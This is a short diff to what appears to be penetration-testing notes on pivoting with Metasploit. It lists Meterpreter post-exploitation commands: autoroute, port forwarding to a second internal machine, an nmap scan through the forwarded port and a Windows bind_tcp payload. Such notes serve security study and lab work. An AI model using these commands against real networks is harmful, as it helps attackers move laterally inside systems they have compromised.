@@ -334,7 +334,11 @@ meterpreter >run autoroute -p
 meterpreter >background
 search portscan/tcp
 
+
+sessions -i 1
+
 meterpreter > portfwd add -l 1234 -p RPORT -r IP_SECONDMACHINE
+portfwd list
 nmap -sV -p 1234 localhost
 background
 set payload windows/meterpreter/bind_tcp
